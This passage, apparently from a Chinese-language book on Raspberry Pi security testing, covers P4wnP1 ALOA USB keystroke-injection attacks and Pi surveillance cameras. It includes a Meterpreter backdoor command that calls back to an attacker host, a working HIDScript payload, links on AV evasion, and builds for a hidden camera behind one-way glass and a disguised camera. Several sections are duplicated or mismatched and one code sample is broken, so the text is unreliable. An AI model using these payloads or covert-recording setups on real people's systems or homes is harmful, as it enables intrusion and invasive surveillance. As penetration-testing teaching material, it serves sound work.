5. 在第一个终端中，再次输入 `:backdoor_meterpreter -lhost [Kali IP 地址]` 命令。

Meterpreter Shell 应该会在第二个终端中打开：





工具 GitHub：[`github.com/mame82/P4wnP1_aloa`](https://github.com/mame82/P4wnP1_aloa)

在本章中，我们将介绍新版本的 P4wnP1。P4wnP1 ALOA 是对原始 P4wnp1 的完全重写，具有许多新功能。在我看来，P4wnP1 ALOA 是适用于树莓派（Raspberry Pi）最好的伦理攻击框架之一。它将多个基于人机接口（HID）的工具合为一体，对其进行了扩展，并允许你通过实时 Web 界面完全更改或控制设备。P4wnP1 拥有大量功能和能力，因此这只是对该工具的快速概述。

## 安装

P4wnP1 ALOA 运行在树莓派 Zero W 上。该工具可以在作者的工具网站获取，但也已添加到官方 Kali Linux ARM 下载页面。安装方法与之前的工具相同，只需下载镜像、解压并将其写入 microSD 卡中。

我们将从 Kali ARM 网站下载镜像：

1. 访问 [`www.offensive-security.com/kali-linux-arm-images/`](https://www.offensive-security.com/kali-linux-arm-images/)。
2. 在 Raspberry Pi 标签页下，下载 Kali Linux P4wnP1 ALOA：
![](img/00199.jpeg)
3. 解压 (`7zip`）并将镜像写入 microSD 卡，使用 `encher` 效果非常好：

![](img/00200.jpeg)

P4wnP1 设计为“无头”模式运行，不需要连接外围设备。只需插入内存卡并将电源线插入树莓派边缘的 USB 接口即可开始使用。请注意，我提到的是将电源线插入边缘接口。当你将 P4wnP1 连接到目标系统时，你将不会使用电源接口，而是使用内部（中间）的 USB 接口——在我们接的章节中请密切关注这一点。

## 连接到 P4wnP1

基本上，P4wnP1 的工作原理是你通过 `SSH` 或 Web 界面连接到它来配置设备。当你准备好使用它时，将设备插入目标系统。与其他 HID 类型设备不同，即使在 P4wnP1 部署后，你仍然可以远程接入并随时修改或重新配置它！有几种连接到 P4wnP1 的方法，我们将涵盖：

1. WiFi 连接
2. USB RNDIS
3. 蓝牙连接

任何时候仅选择三者之一与树莓派交互。我在本章一直使用 WiFi 连接。

#### 1. WiFi 连接

插入 P4wnP1 电源接口几秒后，将出现一个新的 Wi-Fi 网络：
![](img/00201.gif)

- 连接到 WiFi 网络：
密码：`MaMe82-P4wnP1`

你现在可以访问控制面板界面或通过 `SSH` 登录树莓派以进入 Kali Linux 系统。
- 对于 Web 控制界面，打开 浏览器并访问：[`172.24.0.1:8000`](http://172.24.0.1:8000)
![](img/00202.jpeg)

或者直接使用 `Putty` 或 `SSH` 连接到 `172.24.0.1` 以访问底层的 Kali Linux OS：
![](img/00203.gif)

P4wnP1 中使用的 Kali Linux 与你为树莓派安装普通 Kali 时是一样的。它和原始版本一样，带有一个非常精简的安装——仅安装了前 10 个工具。因此，你拥有 `Wireshark`、`nmap`、`Metasploit` 等。如果你需要额外的工具，需要安装之前的 Kali for Pi 章节中提到的 Kali Metapackages。你也可以通过 `apt install` 安装单个工具。但记住，Pi Zero W 的性能没有 Pi 3b+ 强，所以我会有选择地安装。

#### 2. 通过 USB RNDIS 连接

我专门使用 WiFi 连接进行控制，但你也可以通过 RNDIS 连接到树莓派。如果你使用内部（中间）USB 接口将设备插入主机系统，你可以像 USB 以太网设备一样访问该设备。这和你将 P4wnP1 连接到目标系统的方式相同。系统上会出现一个新的“以太网”适配器。你可以通过 `Putty`、`SSH` 或 Web 控制面板界面控制设备。IP 地址将有所不同，现在 `SSH` 接口将变为 `172.16.0.1`，http 控制面板将变为 `172.16.0.1:8000`。

主机系统上会出现一个新的以太网适配器：
![](img/00204.gif)

使用 `SSH` 连接：
![](img/00205.jpeg)

连接到 HTML 控制面板：
![](img/00206.jpeg)

然后你可以更改任何你想要的设置。

#### 3. 通过蓝牙连接

最后，我们也可以连接到 P4wnP1。我专门使用 WiFi 连接进行控制，但你也可以通过 USB RNDIS 连接到树莓派。如果你使用内部（中间）USB 接口将设备插入主机系统，你可以像 USB 以太网设备一样访问该设备。这和你将 P4wnP1 连接到目标系统的方式相同。系统上会出现一个新的“以太网”适配器。你可以通过 `Putty`、`SSH` 或 Web 控制面板界面控制设备。IP 地址将有所不同，现在 `SSH` 接口将变为 `172.16.0.1`，http 控制面板将变为 `172.16.0.1:8000`。

## P4wnP1 控制面板界面

现在我们已经涵盖了几种连接到 P4wnP1 的方法，让我们来看看 P4wnP1 的 Web 控制。工具开发者在界面方面做了非常出色的工作。我之前尝试了许多不同的配置，导致设备处于不稳定状态。任何其他 HID 类型工具可能都需要拔掉、带回主机系统并重新配置。而我能够在连接到目标系统时向设备重新部署默认设置，并恢复了正常工作！

让我们来看看主菜单项：

##### P4wnP1 控制面板
![](img/00210.jpeg)

在主控制面板界面上，顶部有主要的选项按钮，下方窗口有可更改的设置。

##### 连接设置
![](img/00211.jpeg)

从顶部开始，左侧四个菜单按钮用于配置不同的连接类型。你可以更改 WiFi 名称和信道、将蓝牙切换为高速或低功耗、设置 DHCP 范围等。

##### 触发器 (Trigger Actions)
![](img/00212.jpeg)

触发器是新版 P4wnP1 的重要部分。它们确实为工具添加了许多智能脚本。有几个预先存在的脚本可以告诉 P4wnP1 在连接到目标时如何运行：
![](img/00213.jpeg)

当你熟悉了该工具的使用后，可以通过添加自己的触发器将其提升到新水平。你可以根据任何以下事件进行触发：
![](img/00214.jpeg)

并执行任何以下操作：
![](img/00215.jpeg)




这些事件也可以设置为触发一次或多次触发，你还可以添加多个触发器，或者修改现有的触发器。如你所见，通过组合这些设置，你可以创建一个非常强大的攻击工具。可能的组合真的完全取决于想象力。因此，我们只介绍如何使用默认触发器该工具。但我强烈建议读者查看该工具作者的详尽文档，然后尝试它们。

#### HIDScript Editor

![](img/00216.jpeg)

这里是魔法发生的地方。通过 `HIDScript` 编辑器，你可以创建目标系统上运行的类似“Ducky”的脚本。区别在于，你可以通过远程控制接口随时更改这些脚本！当你点击 `HidScript` 菜单标签时，你将看到以下显示：

![](img/00217.jpeg)

继续阅读默认脚本，我们稍后将运行它。该脚本设置了键盘国家布局（如果你遇到脚本问题，请确保将其设置为你的国家代码）。然后它设置了打字速度。注意打字速度是可以编程的。

接下来是 `waitLEDRepeat` 命令。关于该命令、命令语法以及在 P4wnP1 中使用编程命令的大量信息，已在工具文档中涵盖。现在，只需知道当你将 Pi 插入目标系统时，除了 LED 闪烁模式发生改变外，显然什么都不会发生。当 LED 开始反复闪烁时，它处于某种挂起状态，直到你多次按下 `Num Lock` 键。这会“移除安全限制”并允许载荷运行。

使用 `type` 命令输入字符串文本，注意行末尾的 `/n` 代表 `enter` 键。其余命令是一个在屏幕上移动鼠标并更改打字速度的脚本。只需对脚本进行任何你更改，然后点击“Run”（运行）按钮，脚本就会在目标系统上实时执行。

让我们试一下吧！

## 运行你的第一个脚本

我们需要关闭 P4wnP1，将其移动到目标系统，然后运行所需的脚本：

* 点击 P4wnp1 界面菜单上的“Generic Settings”（通用设置）
* 点击“Shutdown”（关闭）
等待几秒让 Pi 关闭（电源 LED 将熄灭）。拔掉 Pi 并移动到目标系统。使用 Pi Zero W 内部（或中间）的 USB 连接器将 Pi 插入目标的 USB 端口。
* 等待几秒让 Pi 连接并配置到目标

在宿主机系统上：

* 重新连接 Pi 的 Wi-Fi
* 回到 P4wnP1 控制面板
* 点击 `HIDScript` 菜单按钮
* 点击“Run”（运行）

这将导致载荷通过 USB 端口在目标系统上执行。我们应该看到记事本自动打开，屏幕上出现打字：

![](img/00218.jpeg)

完成后，关闭目标系统上的记事本。这有多酷吗？在控制面板界面上，我们看到了脚本执行的运行日志以及任务完成屏幕：

![](img/00219.jpeg)

如果你自己制作的脚本出现问题，屏幕底部的执行日志对于查看问题所在位置非常有帮助。错误将给出出现问题的行号，使故障排除变得简单得多。

让我们再试一个！在不从目标系统中移除 Pi 的情况下，我们可以从宿主机远程运行完全不同的攻击脚本。

* 从 `HIDScript` 编辑器菜单中点击“Load & Replace”（加载并替换）
* 选择 `MS_Snake.js`

注意新脚本已显示。阅读脚本看看这个脚本的作用。
* 准备就绪后点击“Run”（运行）
* 在目标 PC 上多次点击“Num Lock”

MSPaint 打开，画出一个矩形，然后连续画出多条线——完全的鼠标控制！同样注意，我们在 P4wnP1 上加载并执行了一个完全不同的脚本，而从未断开过 Pi 与目标之间的连接！

#### 制作你自己的 P4wnP1 脚本

运行预制脚本很有趣，现在让我们尝试编写自己的脚本吧！

1. 从编辑器中选择上一个脚本的所有代码并删除它们。
2. 现在，输入这个新脚本：

```
layout('us');

typingSpeed(10,15)

waitLEDRepeat(NUM);

press("GUI r");

delay(500);

type("cmd\\n");

delay(1000);

type("start iexplore.exe https://youtu.be/dQw4w9WgXcQ\\n");
```

3. 准备就绪后，点击“Run”（运行）
4. 在目标 PC 上多次点击“Num Lock”。

MSPaint 打开，画出一个矩形，然后连续画出多条线——完全的鼠标控制！同样注意，我们在 P4wnP1 上加载并执行了一个完全不同的脚本，而从未断开过 Pi 与目标之间的连接！




另一种类似的恶作剧类型攻击是制作一个 `P4wnP1` 负载，让计算机与用户对话。同样，这是通过使用非常简单的 `PowerShell` 命令实现的。

- 在 Windows 10 上，启动 `PowerShell`
- 输入以下命令，`(New-Object -ComObject SAPI.Voice).Speak("This is a test")`

搞定！计算机应该会用合成语音大声说：“This is a test”。

![](img/)
- 使用 PowerShell & Metasploit 重现伊朗/DC Thunderstruck 蠕虫 - [`cyberarms.wordpress.com/2015/02/09/recreating-iran-acdc-thunderstruck-worm-with-powershell-metasploit/`](https://cyberarms.wordpress.com/2015/02/09/recreating-iran-acdc-thunderstruck-worm-with-powershell-metasploit/)
- 使用 PowerShell 让你的电脑说话 - [`cyberarms.wordpress.com/2015/01/09/making-your-computer-talk-with-powershell/`](https://cyberarms.wordpress.com/2015/01/09/making-your-computer-talk-with-powershell/)
- 简单的 AV 逃逸：赛门克和 P4wnP1 USB - [`medium.com/@fbotes2/advance-av-evasion-symantec-and-p4wnp1-usb-c7899bc6af`](https://medium.com/@fbotes2/advance-av-evasion-symantec-and-p4wnp1-usb-c7899bc6af)

# 第 10 章：物理安全与其他选项

我想涵盖的最后一个主题是使用 `Pi` 进行物理安全。这包括监控摄像头、看护者摄像头和其他选项。由于市上已经有许多关于使用 RPi 进行这些项目的分步教程，因此本章将主要是一个信息性的概述，而不是教程章节。这些项目的完整报告可以在我的 `DanTheIOTMan.com` 博客上找到。

对于本章，你需要：

- Raspberry Pi v2 8 MP 摄像头，配有 `Pi Zero W` 线缆和/或 `Pi3,4` 线缆
- 树莓派摄像头外壳（有很多可选）

可选，你可能还需要：

- 树莓派夜视摄像头
- `ZeroView` 外壳
- `Pi` 电池

注意：如果你使用的是 `Pi Zero W` 与 `Pi3` 或 `4` 系列，摄像头线是不同的。请确保为你的 `Pi` 获取正确的线缆。`Pi 3` 和 `4` 可以使用相同的视频线。

有几种软件解决方案可以将你的树莓派变成监控系统。以下只是你可选的选项之一。有些速度慢一点，但有很多功能，如运动检测和远程警报。另一些没有很多功能，但提供接近实时的视频流。我建议你尝试几种，看看哪种最适合你的应用。

对于普通的摄像头设置，我使用了一个 `Adafruit Pi Zero W Camera kit`，它包含了 `Pi Zero W`、`Pi Camera v2` (800 万像素) 和外壳。虽然这个摄像分辨率很高，但它消耗的电量稍多，运行时可能会有点热。我使用了一个 `Anker Battery Pack`，让摄像头更具移动性：

![](img/zeroview)

`ZeroView` ` 在上面的图片中被截断了，但这实际上与我们之前使用的程序完全相同，只是结尾的命令被更改了。现在有一个进入 `speak` 命令的单一命令。如果你真的很有冒险精神，可以将 `speak` 命令与上一个练习中的隐藏命令混合。你应该能想出一些组合！

![](027.jpeg




我使用了 Pi 0W，但你也可以使用普通的树莓派 3 系列完成完全相同的项目，唯一的区别是 Pi3/4 和 Pi Zero 使用**不同**的视频线。因此，请确保你拥有正确的视频线。除此之外，该项目的步骤是相同的。

## 连接到摄像头

等待几秒让摄像头启动并自动连接到你的 WiFi。然后，在网络浏览器中输入摄像头的 IP 地址。几秒钟，你应该能看到像下面的屏幕：

![](img/00228.jpeg)

恭喜，你刚刚用树莓派制作了你的第一台摄像头！

标题栏左上角有两个图标。带有三条线的圆是设置按钮。人像图标用于更改用户。你默认以普通用户身份登录，因此没有很多可以设置的选项。要访问完整的设置，必须以管理员身份登录（用户名为 `admin`，无密码）并开启“高级设置”（Advanced Settings）。

注意：更改密码！另外，提醒一下，如果你的摄像头不支持，请不要启用“快速网络摄像头”（Fast Network Camera）模式，否则你会丢失配置选项且摄像头可能无法工作。

MotionEyeOS 让你能够设置运行计划（Schedule）。在这里，你可以设置摄像头希望工作的日期和时间，它也适用于运动捕捉的静态图像或电影。在电影部分，你可以将录制模式（Recording Mode）更改为“触发”（Motion Triggered）或“连续”（Continuous）以实现 24/7 录制。最大视频长度很有用，我将其设置为 15 分钟（900 秒），这样每隔 15 分钟就会创建一个新的视频文件，而不是一个巨大的录制文件。

当你使用完摄像头后，建议关闭设备而不是直接掉。关机位于通用设置（General Settings）中：

![](img/00229.jpeg)

## MotionEyeOS 总结

MotionEyeOS 是一个很好的摄像头选择，因为它提供了大量的设置选项。这有助于自定义系统以按你的要求运行，无论是检测到运动时捕捉静态图像，还是仅仅 24x7 运行并保存单个视频文件。让我们看看其他监控软件选项。请记住，随着我们的进行，这些程序的功能可能没有那么多，但流媒体速度越来越快，接近实时。接下来，我们将介绍 RPI Cam Web Interface 软件。RPI Cam 的功能没有 MotionEyeOS 那么，但流媒体速度略快。

## RPI Cam Web Interface 软件

![](img/00230.jpeg)

工具 GitHub：[`github.com/silvanmelchior/RPi\_Cam\_Web_Interface`](https://github.com/silvanmelchior/RPi_Cam_Web_Interface)

工具 Wiki：[`elinux.org/RPi-Cam-Web-Interface`](https://elinux.org/RPi-Cam-Web-Interface)

RPI Cam Web Interface 是树莓派监控摄像头的很好的解决方案。它提供了良好的实时流传输能力，延迟较低（在较低分辨率下），并提供了设置运动检测和计划的选项。我在一个运行 Raspbian Buster Lite 的无头 Pi Zero W（无键盘、鼠标或视频）上使用它。

### 安装 RPI Cam

对于安装，你需要在内存卡上安装 Raspbian lite 镜像。在第一次通电之前，你需要创建一个带有你 WiFi 密码的 `wpa_supplicant` 文件，并向内存卡写入一个空的 `ssh` 文件。

![](img/00231.jpeg)

启动树莓派后，我们需要在树莓派配置（Pi Configuration）中开启摄像头：

- SSH 登录树莓派
- 以用户 `pi` 和密码 `raspberry` 登录
- 输入 `sudo raspi-config`
- 将光标向下移动到“Interfacing Options”（接口选项）并按“回车”
- 选择“P1 Camera”并按“回车”
- 输入“yes”并按“回车”以启用摄像头

![](img/00232.gif)

- 在“OK”提示处按回车，然后光标向下移动并在“Finish”（完成）上按回车
- 在“Yes”上按回车进行重启
- 重启后，输入 `sudo apt update`
- 然后， `sudo apt dist-upgrade`
- 最后，输入 `sudo apt install git`

注意：更改你的登录和 SSH 密码！

现在你可以安装 RPI Cam 软件：

```bash
git clone https://github.com/silvanmelchior/RPi_Cam_Web_Interface.git
cd RPi_Cam_Web_Interface
./install.sh
```

在提示时设置用户名和密码。安装过程可能运行很长时间，因为有很多依赖项。安装 RPI Cam Web Interface 后，你可以通过网络界面查看并控制摄像头，该界面可以通过同一网络上的任何网络浏览器查看。

## 连接并使用 RPi Cam

打开网络浏览器并直接访问摄像头的地址。通过输入 `IP ADDRESS/html/` 进入界面，你应该看到摄像头的实时流：

![](img/0233.jpeg)

该界面非常直观，只需点击菜单即可使用。例如，要开始录制视频，点击“record start”。完成后点击“record stop”。你可以通过“Camera Settings”菜单更改摄像头设置。请记住，流媒体时会有一些延迟问题，但比之前的版本快得多。

要配置运动检测：

- 点击“motion start”
- 然后点击“Edit settings”

有些设置可能晦涩，可以通过 Wiki 查看更多信息。通过“Download Videos and Images”按钮访问保存的数据，如下：

![](img/0234.jpeg)

系统关机。

## RPi Cam 总结

MotionEyeOS 是一个很好的摄像头选择，因为它提供了大量的设置选项。这有助于自定义系统以按你的要求运行，无论是检测到运动时捕捉静态图像，还是仅仅 24x7 运行并保存单个视频文件。让我们看看其他监控软件选项。请记住，随着我们的进行，这些程序的功能可能没有那么多，但流媒体速度越来越快，接近实时。接下来，我们将介绍 RPI Cam Web Interface 软件。RPI Cam 的功能没有 MotionEyeOS 那么，但流媒体速度略快。

### 使用 Raspivid 进行低延迟 Pi 传输

![](img/0235.jpeg)

树莓派 Raspbian 系统内置了基本的显示支持。这些命令可以提供近实时的摄像头控制，但没有之前两个提供的额外控制选项。如果你需要在没有那些复杂功能的树莓派上访问实时摄像头，使用内置命令可能是你的解决方案。此外，直接通过输入命令控制摄像头也很有趣。

#### 安装 Raspivid

你可以使用上一个主题中的 Raspbian 安装。本节和下一节所需的所有命令已内置在 Raspbian 中，因此不需要安装软件。

- 从 RPI Web Interface 点击“Stop Camera”

或者从终端执行：

```bash
cd ~/Pi_Cam_Web_Interface
./stop.sh
```

这将停止 RPI Cam 并允许你使用 `raspivid` 命令控制它。如果你不移除 RPI Cam，每次重启树莓派时都必须运行此命令。

#### 使用 Raspivid 查看视频

首先，我们将如何在本地控制摄像头（树莓派连接显示器并带有键盘），然后我们将介绍如何从另一台计算机远程使用摄像头。由于我们只安装了 Raspbian lite 版本，它将直接启动到终端提示符。

登录并输入：

```bash
raspivid -t 10000
```




你应该可以在显示器上看到几乎没有延迟的近实时视频。`-t` 选项用于指示摄像头显示的时间（以毫秒为单位），在我们的案例中为 10 秒。如果你想保存录制的视频，只需在命令中添加 `-o` 输出开关并加上文件名：

```bash
raspivid -o video.h264 -t 10000
```

生成的视频将保存在你的当前目录中，默认路径为 `\\home\pi\`。如果你需要，可以在之前的命令中添加 `-a 12` 来为视频添加日期和时间。

![](img/00236.jpeg)

关于 `raspivid` 命令以及如何将输出内容转换为 mp4 格式的更多信息，请查阅官方 `raspivid` 网页 2 和 Raspberry Pi 摄像头网页 3。

## 使用 Raspistill 拍摄快照

你也可以使用 `raspistill` 命令拍摄图像快照：

```bash
raspistill -o picture.jpg
```

摄像头将显示在屏幕上，几秒钟后拍摄一张照片，并保存为提供的输出名称。关于拍摄单张照片和额外摄像头命令的更多信息可以在树莓派官方网页 4 上找到。

如果你使用 Putty 等程序远程 SSH 到你的 Pi，你可以运行摄像头命令，如下所示：

![](img/00237.jpeg)

问题是视频不会在远程显示，它仅显示在连接到 Pi 的显示器上。因此从技术上讲，你可以这样运行 Pi 来捕捉远程图像，但你无法远程查看摄像头实际看到的画面。要实现这一点，我们需要一些额外的设置。

## 使用 Raspivid 远程运行 Pi Camera

使用 `raspivid` 命令远程查看视频有多种方法。我将介绍其中一种似乎视频质量最好且延迟最低的方法。在本节中，我们将以“无头”模式运行 Pi，这意味着没有键盘或视频输出。我们还需要另一台 Linux 计算机作为远程查看器，我选择了使用 Kali Linux 系统。

从你的远程系统，SSH 连接到 Pi：

```bash
ssh pi@[your Pi IP Address]
```

![](img/00238.jpeg)

保持该终端窗口打开，并在你的 Linux 系统上打开另一个终端。我们将在普通 Linux 终端和 SSH 终端窗口中输入命令。实际上，我们正通过 SSH 将视频输出从 Pi 重定向到 Kali Linux 系统。这种技术在多个来源中都有讨论，包括树莓派论坛：

[`www.raspberrypi.org/forums/viewtopic.php?t=219461`](https://www.raspberrypi.org/forums/viewtopic.php?t=219461)

在普通的 Linux Terminal 中，运行这些命令：

```bash
apt install mplayer
```

```bash
netcat -l -p 5000 | mplayer -fps 60 -cache 2048 -
```

![](img/00239.jpeg)

在 Linux SSH Terminal 中，运行此命令：

```bash
raspivid -t 0 -w 1280 -h 720 -o - | nc [Linux System IP] 5000
```

![](img/00240.jpeg)

显示可能需要一秒钟时间才会出现。之后，全速、近实时的视频将出现在你的 Linux 计算机上：

![](img/00241.jpeg)

就是这样！只需这两个命令，我们就可以远程查看视频了。完成后，最好在断电之前先关闭 Pi。

## Raspivid 总结

在本节中，我们快速涵盖了如何使用内置的 Raspbian `raspivid` 命令连接并查看摄像头流。我们还学习了如何使用 `netcat` 将视频流传输到远程系统。还有许多其他方法可以使用 `raspivid` 流传输远程视频，甚至可以直接上传到 YouTube，但根据我的所见，这会在过程中产生一些延迟。这就是为什么我更倾向于使用 `netcat` 命令，因为它几乎没有延迟。接下来，我们将看到如何使用 Python 流传输视频。

## 使用 Python 通过 PiCamera 捕获视频

![](img/00242.jpeg)

工具维基：[`projects.raspberrypi.org/en/projects/getting-started-with-picamera`](https://projects.raspberrypi.org/en/projects/getting-started-with-picamera)

这是我将介绍的制作树莓派监控摄像头的四种解决方案中的最后一种。随着我们的进展，我们从提供许多额外功能但由于这些功能导致某些视频延迟的解决方案，转向了提供近实时视频流但没有提供额外装饰功能的解决方案。Python `PiCamera` 是一种用于控制 RPi 摄像头的 Python 解决方案。它非常快，如果你是一个 Python 专家，你甚至可以通过自定义编程创建自己的监控系统。

即使你不是 Python 大师（我显然不是！），只需通过阅读文档，`PiCamera` 仍然很容易学习。它也很容易使用。

### PiCamera 设置

即使你不是 Python 大师（我显然不是！），只需通过阅读文档，`PiCamera` 仍然非常容易学习。它也很容易使用。

### PiCamera 文档

`PiCamera` 是一种用于控制 RPi 摄像头的 Python 解决方案。它非常快，如果你是一个 Python 专家，你甚至可以通过自定义编程创建自己的监控系统。

即使你不是 Python 大师（我显然不是！），只需通过阅读文档，`PiCamera` 仍然非常容易学习。它也很容易使用。

### 使用 PiCamera 查看视频

```python
from picamera import Camera
from time import sleep

camera = Camera()
camera.start_preview()
sleep(20)
camera.stop_preview()
```

### 使用 PiCamera 录制视频

```python
import datetime
import time
import picamera

date = datetime.datetime.now().strftime("%m_%d_%Y_%H_%M_%S")

with picamera.PiCamera() as camera:
    camera.start_preview()
    camera.start_recording("/home/pi/"+ date + "video.h264")
    camera.wait_recording(30)
    camera.stop_recording()
    camera.stop_preview()
```

### 使用 PiCamera 进行远程流传输

PiCamera 文档包含一个从远程系统访问 PiCamera 的脚本。该脚本位于：

[`picamera.readthedocs.io/en/release-1.13/recipes2.html#web-streaming`](https://picamera.readthedocs.io/en/release-1.13/recipes2.html#web-streaming)




你应该能看到来自摄像头的画面流。

![](img/00246.jpeg)

欲了解关于 `PiCamera` 的更多信息，请查看 `PiCamera` 文档网页。

## PiCamera 总结

在本文中，我们涵盖了如何使用 Python `PiCamera` 控制树莓派摄像头。对于精通 Python 并想要在程序中加入摄像头控制的用户来说，`PiCamera` 是一个极佳的解决方案。`PiCamera` 的作者还通过提供优秀的文档和易懂的示例程序，让非编程人员也能轻松使用。

## 其他项目可能性：便携式夜视！

`Raspberry Pi` 是我用过的功能最强大的单板计算机之一。上面的示例是 `Pi Camera` 的常规用法，可以帮助你入门。如果你发挥想象力，可以用你的 `RPis` 创造出非常有趣的作品，就像这个项目：我的便携式夜视系统。

![](img/00247.jpeg)

使用一个 `Raspberry Pi` 7 英触摸屏外壳，我只需将 `NV` 摄像头的电缆从外壳顶部引出，并将摄像头安装在外壳上。然后，我连接了一个 `Anker` 口红笔式电池供电。如下所示：

![](img/00248.jpeg)

使用基于我们涵盖的简单 `PiCamera` 脚本，我能够在触摸屏显示器上查看 `Night Vision` 视频，并捕捉实时高清视频进行播放。这是深夜厨房内部的景象，实际上肉眼过去什么也看不见：

![](img/00249.jpeg)

图片中没有显示，但你可以清晰地读出台面上的标签。虽然范围只有中等到大房间的大小，但它运行得非常好。这是我想要构建的未来夜视系统的跳板——我的意思是，等我有时间的时候。

## 伪装监控摄像头

我的另一个作品是伪装监控。我拿了一个假外外摄像头，并正通过 `Raspberry Pis` 将其转换为一个真实的摄像头系统。我考虑过添加第二个 `Pi` 或小开发板来扫描无线信号。

![](img/00250.jpeg)

## 魔法镜子

`Pi` 的灵活性为许多家庭监控安全项目提供了可能。你可以通过结合多个 `RPis` 和双向玻璃来制作 `Magic Mirrors`。一个 `Pi` 处理 `Magic Mirror` 功能，另一个可以被设置为摄像头。当然，不要用这些东西做愚蠢的事，并务必遵守你的联邦、州和当地法律。这是几年前我制作的大型 `Magic Mirror`；它由 `Raspberry Pi 3` 供电：

![](img/00251.jpeg)

定制的机柜容纳了一个全尺寸的 `HDMI Display` 和 `Pi`：

![](img/00252.jpeg)

下一个是家庭监控 `Magic Mirror`。一台旧安卓手机处理 `Magic Mirror` 界面，一个带有摄像头的 `Pi Zero W` 提供监控功能：

![](img/00253.jpeg)

这从本质上只是一个巨大的画框、一块单向玻璃和一台运行 Android 版 `Magic Mirror` 程序的旧安卓手机：

![](img/00254.jpeg)

还有一个小惊喜：

![](img/00255.jpeg)

别介意我在 `Pi` 周围做得很糟糕，但它成功了！我只是在 `Pi0W` 上运行了我们之前涵盖的监控摄像头解决方案之一。这样做，我能够通过单向玻璃远程查看视频！胶带非常重要，因为你不允许背面的任何光线透进来，否则会严重影响你的视频录制。

这些只是两个例子；可能性真的仅限于想象力。网上已经有许多关于如何制作智能镜子的教程和视频，所以我不会详细介绍任何具体的构建细节。尽管你只需要一个 `RPi` 或旧安卓手机、一个适用于 `RPi5` 的 `MagicMirror2` 软件、单向玻璃和一个大画框。更具冒险精神的构建者可能想要制作一个自定义外壳并使用 `HDMI display`。如果你决定为你的项目使用全尺寸显示器，请务必小心，因为这通常涉及到拆掉外壳，可能会出现很多问题，你最终可能得到一个镇纸而不是一个正常工作的显示器——提警告了。即使没有监控部分，`Magic Mirrors` 也是一个全家有趣的项目，去尝试一下吧！

## 使用 RTL-SDR 和 Salamandra 寻找窃听器

工具作者：`Eldraco`

工具 GitHub: [`github.com/eldraco/Salamandra`](https://github.com/eldraco/Salamandra)

![](img/00256.jpeg)

随着物联网（IoT）设备的爆炸，以及某些硬件现在因间谍担忧而在某些设施中被禁止，如果有一种简单的方法可以扫描你的设施、酒店房间等，查看是否有隐藏的麦克风窃听设备，那就好了。`Salamandra` 是一个用于在封闭环境中检测和定位窃听麦克风设备的工具。通常你在网上找到的窃听器会录制音频并在特定频率重新广播。`Salamandra` 会显示任何检测到的麦克风类型设备及其广播频率。通过显示的信号强度，可以找到设备的大致。

![](img/00257.jpeg)

我在我的网站上介绍了如何使用 `Kali Linux`、`RTL-SDR`（我使用了带有附带伸缩天线的 `NooElec Nesdr Smart`）和 `Salamandra`：

[`cyberarms.wordpress.com/2018/07/08/finding-spy-bugs-with-an-rtl-sdr-salamandra`](https://cyberarms.wordpress.com/2018/07/08/finding-spy-bugs-with-an-rtl-sdr-salamandra/)

## 使用树莓派追踪飞机

好了，这个与安全没有关系，它只是一个酷的 `Pi` 项目。实时飞行追踪网站非常有用。它们允许你看到世界各地航班的实际位置。你可以使用 `Raspberry Pi` 创建一个简单的扫描器，让你能够追踪附近的飞机！自动相关监视广播（`Automatic Dependent Surveillance – Broadcast`或 `ADS-B`）是飞机公开广播的信号，允许其被追踪。飞机爱好者有几种方法接收这些信号并在地图上绘制飞机的位置。爱好者实现这一点最简单的方法之一是使用 `Raspberry Pi 3` 和一个 `SDR-RTL` USB 适配器。

使用树莓派追踪飞机非常简单，你只需要 `SDR-RTL`、运行 `Raspbian` 的 `Pi 3` 以及 `ADS-B` 映射软件。当软件运行时，`SDR-RTL` 接收飞机的信号，然后在 Google 地图类型的显示上实时绘制它们的位置。我使用了以下设备：

字体 运行 `Raspbian` 的 `Pi 3b`
- 带有标准伸缩天线的 `NooElec NESDR SMART` USB
- `Pi 3`，7 英寸触摸屏外壳




# 使用 Pi-Hole 拦截广告和恶意软件网站

![](img/00259.jpeg)

工具网站：[`pi-hole.net/`](https://pi-hole.net/)

工具维基（Wiki）：[`docs.pi-hole.net/`](https://docs.pi-hole.net/)

最后，树莓派的另一个用途是使用 Pi-Hole 拦截那些烦人的广告和恶意软件网站。Pi-Hole 是一种运行在树莓派（以及其他平台）上的全网广告拦截器。你也可以配合 Pi-Hole 使用 TFT 显示器来一眼查看统计数据。Pi-Hole 可以运行在任何支持的设备上。我使用了 Adafruit 的 2.8 英 TFT 电阻式 Pi-Hole 套件，配合树莓派 3b。它的组装和使用非常简单：

[`blog.adafruit.com/2018/10/11/new-product-ad-blocking-kit-for-pi-hole-with-2-8-pitft-no-soldering/`](https://blog.adafruit.com/2018/10/11/new-product-ad-blocking-kit-for-pi-hole-with-2-8-pitft-no-soldering/)

- Adafruit 在此处提供了其套件整个过程的完整说明：[`learn.adafruit.com/pi-hole-ad-pitft-tft-detection-display/overview`](https://learn.adafruit.com/pi-hole-ad-pitft-tft-detection-display/overview)
- 也可以在 Pi-Hole  Wiki 上找到完整的安装指南：[`docs.pi-hole.net/`](https://docs.pi-hole.net/)

我将只快速介绍安装过程。如果你购买了 Adafruit 套件，我强烈建议你按照他们网站上提供的步骤操作！理解将树莓派作为整个家庭或办公室的 DNS 服务器的安全影响至关重要。如果你不完全熟悉配置树莓派、DNS 服务器、网络安全和网络配置，请不要尝试自行操作。由于网络配置多种多样，请自担承担风险，我无法为此设置提供技术支持。

## 安装 Raspbian Lite

只需下载适用于你树莓派对应的文件（我使用的是 Pi3b）并将其写入 microSD 卡。在从读卡器取出内存卡之前，在卡中添加一个名为 `ssh` 的空白文本文件，这将在你首次启动 Raspbian 时默认启用 SSH。

注意：不要忘记更改你的树莓派密码，并使用长且复杂的密码！

将外围设备连接到树莓派，插入 microSD 卡，并为树莓派供电。你现在应该可以通过 SSH 登录树莓派了。

## 安装 Raspbian 更新

在终端中运行以下命令：

```bash
apt update
apt upgrade
```

此外，在 `Raspi-Config` 中，如果你在美国，将你的区域设置（locale）设置为 `US`，或者你实际所在的国家代码——它默认是 `GB`，如果这不正确，在运行 Pi-Hole 的图形化 PADD 界面时会导致很多问题。

## 安装 Pi-Hole & PADD

安装 Pi-Hole 非常简单。在 Raspbian 终端输入：

```bash
curl -sSL https://install.pi-hole.net | bash
```

然后按照安装提示进行操作。

## 安装 PADD

![](img/0260.jpeg)

